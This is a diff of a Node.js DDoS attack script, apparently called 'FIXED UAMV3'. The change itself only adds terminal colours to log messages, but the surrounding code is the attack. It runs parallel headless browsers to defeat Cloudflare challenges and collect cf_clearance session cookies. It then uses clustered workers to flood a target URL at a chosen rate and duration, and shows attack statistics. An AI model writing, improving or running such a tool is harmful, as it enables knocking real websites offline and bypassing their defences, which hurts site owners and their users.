@@ -200,7 +200,7 @@ async function bypassCloudflareOnce(attemptNum = 1) {
     let browser = null;
     let page = null;
     try {
-        console.log(`[+] STARTING BYPASS ATTEMPT ${attemptNum}...`);
+        console.log(`\x1b[33m[+] STARTING BYPASS ATTEMPT ${attemptNum}...\x1b[0m`);
         response = await connect({
             headless: 'auto',
             args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-gpu', '--window-size=1920,1080'],
@@ -209,7 +209,7 @@ async function bypassCloudflareOnce(attemptNum = 1) {
         browser = response.browser;
         page = response.page;
         await page.goto(args.target, { waitUntil: 'domcontentloaded', timeout: 45000 });
-        console.log("[+] CHECKING FOR CLOUDFLARE CHALLENGE...");
+        console.log("\x1b[36m[+] CHECKING FOR CLOUDFLARE CHALLENGE...\x1b[0m");
         
         let challengeCompleted = false;
         let waitCount = 0;
@@ -219,11 +219,11 @@ async function bypassCloudflareOnce(attemptNum = 1) {
             const cookies = await page.cookies();
             if (cookies.some(c => c.name === "cf_clearance")) {
                 challengeCompleted = true;
-                console.log(`[+] CF_CLEARANCE COOKIE FOUND AFTER ${waitCount * 0.5} SECONDS.`);
+                console.log(`\x1b[32m[+] CF_CLEARANCE COOKIE FOUND AFTER ${waitCount * 0.5} SECONDS.\x1b[0m`);
                 break;
             }
             if (waitCount % 20 === 0) {
-                console.log(`[+] STILL WAITING FOR CF_CLEARANCE COOKIE... (${waitCount * 0.5} SECONDS ELAPSED)`);
+                console.log(`\x1b[33m[+] STILL WAITING FOR CF_CLEARANCE COOKIE... (${waitCount * 0.5} SECONDS ELAPSED)\x1b[0m`);
             }
         }
 
@@ -235,17 +235,17 @@ async function bypassCloudflareOnce(attemptNum = 1) {
              throw new Error("CF_CLEARANCE COOKIE NOT FOUND AFTER WAIT.");
         }
 
-        console.log(`[+] BYPASS ATTEMPT ${attemptNum} SUCCESSFUL.`);
+        console.log(`\x1b[32m[+] BYPASS ATTEMPT ${attemptNum} SUCCESSFUL.\x1b[0m`);
         return { cookies, userAgent, success: true, attemptNum };
     } catch (error) {
-        console.log(`[+] BYPASS ATTEMPT ${attemptNum} FAILED: ${error.message}`);
+        console.log(`\x1b[31m[+] BYPASS ATTEMPT ${attemptNum} FAILED: ${error.message}\x1b[0m`);
         try { if (browser) await browser.close(); } catch (e) {}
         return { cookies: [], userAgent: "", success: false, attemptNum };
     }
 }
 
 async function bypassCloudflareParallel(totalCount) {
-    console.log("[+] CLOUDFLARE BYPASS - PARALLEL MODE");
+    console.log("\x1b[35m[+] CLOUDFLARE BYPASS - PARALLEL MODE\x1b[0m");
     
     const results = [];
     let attemptCount = 0;
@@ -254,7 +254,7 @@ async function bypassCloudflareParallel(totalCount) {
     while (results.length < totalCount) {
         const remaining = totalCount - results.length;
         const currentBatchSize = Math.min(batchSize, remaining);
-        console.log(`[+] STARTING PARALLEL BATCH (${currentBatchSize} SESSIONS)...`);
+        console.log(`\x1b[33m[+] STARTING PARALLEL BATCH (${currentBatchSize} SESSIONS)...\x1b[0m`);
         
         const batchPromises = Array.from({ length: currentBatchSize }, () => bypassCloudflareOnce(++attemptCount));
         const batchResults = await Promise.all(batchPromises);
@@ -262,9 +262,9 @@ async function bypassCloudflareParallel(totalCount) {
         for (const result of batchResults) {
             if (result.success && result.cookies.length > 0) {
                 results.push(result);
-                console.log(`[+] SESSION ${result.attemptNum} OBTAINED! (TOTAL: ${results.length}/${totalCount})`);
+                console.log(`\x1b[32m[+] SESSION ${result.attemptNum} OBTAINED! (TOTAL: ${results.length}/${totalCount})\x1b[0m`);
             } else {
-                console.log(`[+] SESSION ${result.attemptNum} FAILED`);
+                console.log(`\x1b[31m[+] SESSION ${result.attemptNum} FAILED\x1b[0m`);
             }
         }
         if (results.length < totalCount) await new Promise(r => setTimeout(r, 2000));
@@ -367,11 +367,11 @@ function displayStats() {
     const remaining = Math.max(0, args.time - elapsed);
     
     console.clear();
-    console.log("[+] FIXED UAMV3 - 100% DDOS SUCCESS");
-    console.log(`[+] TARGET: ${args.target}`);
-    console.log(`[+] TIME: ${elapsed}S / ${args.time}S`);
-    console.log(`[+] REMAINING: ${remaining}S`);
-    console.log(`[+] CONFIG: RATE: ${args.Rate}/S | THREADS: ${args.threads} | SESSION: ${global.bypassData ? global.bypassData.length : 0} / ${args.cookieCount} REQUESTED`);
+    console.log("\x1b[35m[+] FIXED UAMV3 - 100% DDOS SUCCESS\x1b[0m");
+    console.log(`\x1b[36m[+] TARGET:\x1b[0m ${args.target}`);
+    console.log(`\x1b[36m[+] TIME:\x1b[0m ${elapsed}S / ${args.time}S`);
+    console.log(`\x1b[36m[+] REMAINING:\x1b[0m ${remaining}S`);
+    console.log(`\x1b[36m[+] CONFIG:\x1b[0m RATE: ${args.Rate}/S | THREADS: ${args.threads} | SESSION: ${global.bypassData ? global.bypassData.length : 0} / ${args.cookieCount} REQUESTED`);
 
     let totalStatuses = {};
     let totalRequests = 0;
@@ -387,14 +387,14 @@ function displayStats() {
             totalRequests += msg.totalRequests || 0;
         }
     }
-    console.log(`[+] STATISTICS:`);
-    console.log(`   [+] TOTAL REQUESTS: ${totalRequests}`);
-    console.log(`   [+] RATE: ${elapsed > 0 ? (totalRequests / elapsed).toFixed(2) : 0} REQ/S`);
-    console.log(`   [+] STATUS CODES:`, totalStatuses);
+    console.log(`\x1b[33m[+] STATISTICS:\x1b[0m`);
+    console.log(`   \x1b[36m[+] TOTAL REQUESTS:\x1b[0m ${totalRequests}`);
+    console.log(`   \x1b[33m[+] RATE:\x1b[0m ${elapsed > 0 ? (totalRequests / elapsed).toFixed(2) : 0} REQ/S`);
+    console.log(`   \x1b[32m[+] STATUS CODES:\x1b[0m`, totalStatuses);
 
     const progress = Math.floor((elapsed / args.time) * 30);
     const progressBar = "█".repeat(progress) + "░".repeat(30 - progress);
-    console.log(`\n[+] PROGRESS: [${progressBar}]`);
+    console.log(`\n\x1b[36m[+] PROGRESS: [\x1b[32m${progressBar}\x1b[36m]\x1b[0m`);
 }
 
 global.activeConnections = new Set();
@@ -403,8 +403,8 @@ global.startTime = Date.now();
 global.bypassData = [];
 
 if (process.argv.length < 7) {
-    console.log(`[+] USAGE: NODE ${process.argv[1]} <TARGET> <TIME> <RATE> <THREADS> <COOKIECOUNT>`);
-    console.log(`[+] EXAMPLE: NODE ${process.argv[1]} HTTPS://EXAMPLE.COM 60 100 8 5`);
+    console.log(`\x1b[31m[+] USAGE: NODE ${process.argv[1]} <TARGET> <TIME> <RATE> <THREADS> <COOKIECOUNT>\x1b[0m`);
+    console.log(`\x1b[33m[+] EXAMPLE: NODE ${process.argv[1]} HTTPS://EXAMPLE.COM 60 100 8 5\x1b[0m`);
     process.exit(1);
 }
 
@@ -420,14 +420,14 @@ const parsedTarget = url.parse(args.target);
 
 if (cluster.isMaster) {
     console.clear();
-    console.log("[+] FIXED UAMV3 - 100% DDOS SUCCESS");
+    console.log("\x1b[35m[+] FIXED UAMV3 - 100% DDOS SUCCESS\x1b[0m");
     
     (async () => {
         const bypassResults = await bypassCloudflareParallel(args.cookieCount);
         global.bypassData = bypassResults;
         
-        console.log(`[+] SUCCESSFULLY OBTAINED ${bypassResults.length} SESSION(S)!`);
-        console.log("[+] STARTING ATTACK...");
+        console.log(`\x1b[32m[+] SUCCESSFULLY OBTAINED ${bypassResults.length} SESSION(S)!\x1b[0m`);
+        console.log("\x1b[32m[+] STARTING ATTACK...\x1b[0m");
         
         global.startTime = Date.now();
         
@@ -453,7 +453,7 @@ if (cluster.isMaster) {
         
         setTimeout(() => {
             clearInterval(statsInterval);
-            console.log("[+] ATTACK COMPLETED!");
+            console.log("\x1b[32m[+] ATTACK COMPLETED!\x1b[0m");
             process.exit(0);
         }, args.time * 1000);
     })();
